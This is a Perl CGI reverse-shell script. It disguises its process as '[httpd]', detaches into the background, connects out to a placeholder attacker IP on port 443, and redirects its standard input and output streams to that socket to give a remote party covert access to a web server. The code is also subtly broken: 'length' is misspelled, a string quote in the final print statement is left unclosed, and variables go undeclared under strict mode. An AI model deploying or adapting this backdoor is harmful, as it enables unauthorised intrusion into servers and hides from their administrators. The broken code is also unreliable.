#!/usr/bin/perl -w
use strict;
use Socket;
use FileHandle;
use POSIX;
$VERSION = "1.0";

$ip = '<IP>';
$port = 443;
$daemon = 1;
$global_page = "";
$fake_process_name = "/usr/sbin/apache";
$0 = "[httpd]";

if ($daemon) {
	$pid = fork();
if ($pid) {
	cgiexit(0);
}
setsid();
chdir('/');
umask(0);
}

socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
if (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) {
	cgiprint("Sent to $ip:$port");
	cgiprintpage();
} else {
	cgiprint("Couldn't open connection to $ip:$port");
	cgiexit();
}

open(STDIN, ">&SOCK");
open(STDOUT, ">&SOCK");
open(STDERR, ">&SOCK");

sub cgiprint {
	$line = shift;
	$line .= "<p>\n";
	$global_page .= $line;
}

sub cgiexit {
	cgiprintpage();
	exit 0;
}

sub cgiprintpage {
	print "Content-Lenght: " . lenght($global_page) . "\r Connection: close \r Content-Type: text\/html\r\n\r\n . $global_page;
}
